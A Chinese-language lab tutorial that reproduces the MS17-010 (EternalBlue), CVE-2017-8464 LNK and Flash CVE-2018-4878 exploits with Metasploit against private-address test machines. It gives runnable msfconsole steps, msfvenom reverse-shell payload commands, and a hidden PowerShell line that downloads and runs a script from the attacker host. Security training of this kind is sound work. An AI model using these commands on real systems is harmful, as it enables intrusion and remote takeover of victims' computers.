---
slug: /net-security/10/10
---



Kali MSF（The Metasploit Framework），开源的漏洞利用和测试工具。

MSF 提供 MSFconsole 接口：

![](http://img.wukaipeng.com/2024/02/06-235229-gbrJi1-image-20240206235227871.png)

## MS17-010 漏洞

### 漏洞描述

永恒之蓝漏洞（MS17-010），它的爆发源于 WannaCry 勒索病毒的诞生，该病毒是不法分子利用 NSA（National Security Agency，美国国家安全局）泄露的漏洞“EternalBlue”（永恒之蓝）进行改造而成。

该漏洞可以通过 TCP 的 139 和 445 端口，攻击 Windows 系统的 SMB 服务，造成远程代码执行。

MS17-010 漏洞主要是针对于 Windows7 及以前的操作系统。

### 漏洞复现

Win7 需要满足这四个条件：

1. 关闭防火墙
2. 使用 SMBv1 协议
3. 缺少 MS17-010 补丁
4. 允许匿名 IPC &dollar; 和管道符 

> 从 MSDN 下载的镜像默认满足第 2、3 点
>
> 对于第 4 点，用 `window + R` 打开 run 程序，输入 `gpedit.msc` 打开本地策略编辑器
>
> 关闭「限制对命令管道和共享的匿名访问」：
>
> ![](http://img.wukaipeng.com/2024/02/08-235041-pDmfFl-image-20240208235041088.png)
>
> 改完之后重启电脑



首先进入 msfconsole

```bash
msfconsole
```

接下来搜索该漏洞利用，可以搜到四个可利用模块，先用第一个：

```bash
search MS17-010
use 0
```

查看所需的配置

```bash
show options
```

设置一下缺少的配置：



![](http://img.wukaipeng.com/2024/02/08-235705-lRXkJy-image-20240208235705660.png)

```bash
set rhosts 172.16.26.1
```

攻击

```bash
exploit
```



修复方法：

1️⃣ 部署安全产品

2️⃣ 打补丁

3️⃣ 关端口

4️⃣ Windows 防火墙做白名单策略

## 远程命令执行漏洞 CVE-2017-8464（震网三代）

### 漏洞描述

2017 年 6 月 13 日，微软官方发布编号为 CVE-2017-8464 的漏洞公告，官方介绍 Windows 系统在解析快捷
方式时存在远程执行任意代码的高危漏洞，黑客可以通过 U 盘、网络共享等途径触发漏洞，完全控制用
户系统，安全风险高危。

Windows 系统使用二进制解析。LNK 文件，当恶意二进制代码被系统识别执行时即可实现远程代码执行，
由于是在 explorer.exe 进程中运行，所以 load 进内存时与当前用户具有相同权限。

攻击者利用这一解析过程将包含恶意二进制的代码附带进可移动驱动器（或远程共享过程中），受害者
使用 powershell 解析 .LNK 文件后即被黑客所控制。

成功利用此漏洞的攻击者可能会获得与本地用户相同的用户权限。

### 漏洞利用

1. 在 kali 中利用 msfvenom 生成一个反弹 shell

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.26.129 lport=4444 -f psh-reflection > ~/magedu.ps1
```

![](http://img.wukaipeng.com/2024/02/08-175726-y2WWfT-image-20240208175725260.png)

在 Home 目录可以看到新生成的 `magedu.ps1` 文件

将该文件复制到 `/var/www/html` 文件夹中，目的是让该木马文件被访问

```bash
cp ~/magedu.ps1 /var/www/html 
```

在 kali 中启动 Apache 服务（默认端口为 80）

```bash
service apache2 start
```

启动后在目标机器上可访问该地址到 `megadu.psq` 木马文件：

![](http://img.wukaipeng.com/2024/02/08-230617-vbqQTv-image-20240208230617185.png)

接着在目标机器上创建快捷方式：

```
powershell -windowstyle hidden -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://172.16.26.129/magedu.ps1');test.ps1"
```

![](http://img.wukaipeng.com/2024/02/08-230541-drFSv2-image-20240208230541033.png)

在 kali 创建反弹 shell：

```bash
msfconsole
use exploit/multi/handler   //侦听模块
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 172.16.26.129
show options
```

在目标机器上打开快捷方式，kali 这边就能看到已经攻击成功了：

![](http://img.wukaipeng.com/2024/02/08-230807-XTDY8x-image-20240208230807213.png)

输入 `screenshot` 命令，可以看到截图成功：

![](http://img.wukaipeng.com/2024/02/08-232542-8cWNkk-image-20240208232542173.png)

## Flash 漏洞 CVE-2018-4878

### 漏洞描述

2018年2月1号，Adobe官方发布安全通报（APSA18-01），声明 Adobe Flash 28.0.0.137 及其之前的版本，存在高危漏洞（CVE-2018-4878）。

攻击者通过构造特殊的Flash链接，当用户用浏览器/邮件/Office访问此 Flash 链接时，会被“远程代码执行”，并且直接被 getshell。

参考链接：https://blog.51cto.com/chenxinjie/2093653

### 漏洞利用

下载工具：

生成攻击代码

```
msfvenom -p windows/meterpreter/reverse_tcp lhost=172.16.26.129 lport=4445  -f python>magedu_shellcode.txt
```

将生成代码替换到 python脚本中：

![](http://img.wukaipeng.com/2024/02/13-140651-EiUoJO-image-20240213140651325.png)



执行脚本：

![](http://img.wukaipeng.com/2024/02/13-140746-MF6F8s-image-20240213140746713.png)

将生成的脚本复制到  `/var/www/html` 中，并启动 apache 服务器

![](http://img.wukaipeng.com/2024/02/13-141103-V53UJz-image-20240213141103378.png)

```
service apache2 start
```

启动监听

```
msfconsole                         
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost 172.16.26.129               
set lport 4445
exploit
```



目标机器上安装 Flash

![](http://img.wukaipeng.com/2024/02/13-140452-kjifgr-image-20240213140452183.png)

在目标机器上打开 `172.16.26.129/index2.html`

![](http://img.wukaipeng.com/2024/02/13-140538-NZ6GrL-image-20240213140538664.png)

利用成功：

![](http://img.wukaipeng.com/2024/02/13-134936-TTJ3ak-image-20240213134935625.png)











